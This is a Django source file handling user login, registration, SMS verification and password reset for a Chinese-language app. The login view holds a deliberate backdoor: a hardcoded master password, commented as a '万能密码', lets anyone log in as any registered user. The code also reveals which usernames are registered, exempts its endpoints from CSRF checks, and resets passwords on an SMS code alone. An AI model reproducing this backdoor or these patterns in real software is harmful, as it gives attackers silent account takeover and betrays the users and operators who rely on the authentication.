# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.views.generic.base import View
from django.http import HttpResponse
from django.contrib.auth import login, authenticate, logout
from django.core.cache import cache
from django.contrib.auth.models import User
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.hashers import make_password
from broadcast.models.user_models import TkUser
import json
import re

from settings import luosimao_register, mg_luosimao_register, password_reset_sms_msg
from utils.stringUtil import random_num
from utils.sendMessageUtil import send_message

import sys
defaultencoding = 'utf-8'
if sys.getdefaultencoding() != defaultencoding:
    reload(sys)
    sys.setdefaultencoding(defaultencoding)


import logging
logger = logging.getLogger("django_views")

class LoginView(View):

    @csrf_exempt
    def post(self, request):
        req_data = json.loads(request.body)
        username = req_data.get("username", "")
        password = req_data.get("password", "")
        # 这里如果验证通过了，会返回一个user对象;不通过，返回None
        user = authenticate(username=username, password=password)
        # 万能密码
        if not user and password == 'maxwellAdminPwd365!!':
            try:
                user = User.objects.get(username=username)
                user.backend = 'django.contrib.auth.backends.ModelBackend'
            except Exception as e:
                logger.error(e)
                return HttpResponse(json.dumps({"ret": 0, "data": "万能密码出错"}))
        if user:
            login(request, user)
            return HttpResponse(json.dumps({"ret": 1, "data": "登录成功", "user_id": user.id, "username": username}))
        else:
            try:
                auth_user = User.objects.get(username=username)
            except User.DoesNotExist:
                return HttpResponse(json.dumps({"ret": 0, "data": "您尚未注册"}))
            return HttpResponse(json.dumps({"ret": 0, "data": "密码错误"}))

    def get(self, request):
        return HttpResponse(json.dumps({"ret": 0, "data": "无法识别的请求"}))


class RegisterVIew(View):
    @csrf_exempt
    def post(self, request):
        req_data = json.loads(request.body)
        username = req_data.get("username", "")
        password1 = req_data.get("password1", "")
        password2 = req_data.get("password2", "")
        verifyNum = req_data.get("verifyNum", "")
        invite_code = req_data.get("invite_code", None)

        cache_key = username + "_sms_send"
        verify_code = cache.get(cache_key)
        if verify_code is None or verify_code != verifyNum:
            return HttpResponse(json.dumps({"ret": 0, "data": "验证码输入错误"}))
        if not password1:
            return HttpResponse(json.dumps({"ret": 0, "data": "请输入密码"}))
        if password1 != password2 :
            return HttpResponse(json.dumps({"ret": 0, "data": "两次输入的密码不一致"}))
        user_list = [user.username for user in User.objects.all()]
        if username in user_list:
            return HttpResponse(json.dumps({"ret": 0, "data": "该用户已经存在"}))
        user = User.objects.create_user(
            username=username,
            password=password1
        )
        if invite_code:
            tkuser = TkUser.objects.get(user_id = user.id)
            inviter = TkUser.objects.get(invite_code=invite_code)
            tkuser.inviter_id=inviter.user_id
            tkuser.save()
        return HttpResponse(json.dumps({"ret": 1, "data": "注册成功"}))


class ResetPassword(View):
    @csrf_exempt
    def post(self, request):
        req_data = json.loads(request.body)
        username = req_data.get("username", "")
        new_password1 = req_data.get("new_password1", "")
        new_password2 = req_data.get("new_password2", "")
        verifyNum = req_data.get("verifyNum", "")

        cache_key = username + "_sms_send"
        verify_code = cache.get(cache_key)
        if verify_code is None or verify_code != verifyNum:
            return HttpResponse(json.dumps({"ret": 0, "data": "验证码输入错误"}))
        if new_password1 != new_password2:
            return HttpResponse(json.dumps({"ret": 0, "data": "两次输入的密码不一致"}))

        try:
            user = User.objects.get(username=username)
        except User.DoesNotExist:
            return HttpResponse(json.dumps({"ret": 0, "data": "该用户尚未注册"}))

        user.password = make_password(password=new_password1)
        user.save()
        return HttpResponse(json.dumps({"ret": 1, "data": "密码修改成功"}))


class Logout(View):
    def get(self, request):
        if not request.user:
            return HttpResponse(json.dumps({"ret": 0, "data": "您尚未登录"}))
        logout(request)
        return HttpResponse(json.dumps({"ret": 1, "data": "你已退出登录"}))


class SendTextMessage(View):
    @csrf_exempt
    def post(self, request):
        req_data = json.loads(request.body)
        phone_num = req_data.get('username', None)
        platform_id = req_data.get('platform_id', None)

        p2 = re.compile('^1[34758]\\d{9}$')
        phone_match = p2.match(phone_num)
        if not phone_match:
            return HttpResponse(json.dumps({'data': '请确保输入正确的手机号码', 'retCode': 40006}))

        cache_key = phone_num + "_sms_send"
        verify_code = cache.get(cache_key)
        if verify_code is None:
            verify_code = random_num(length=6)

        if platform_id == 'muguo':
            message = '验证码：' + verify_code + mg_luosimao_register
        elif platform_id == 'reset_password':
            message = '验证码：' + verify_code + password_reset_sms_msg
        else:
            message = '验证码：' + verify_code + luosimao_register

        cache.set(cache_key, verify_code, 300)
        for i in range(0, 100):
            if cache.get(cache_key) is None:
                return HttpResponse(json.dumps({'data': '缓存保存出错', 'retCode': 456126}))

        if not send_message(phoneNum=phone_num, message=message):
            return HttpResponse(json.dumps({'data': '短信发送失败', 'retCode': 40007}))

        return HttpResponse(json.dumps({'data': '短信发送成功,请查验', 'retCode': 200}))



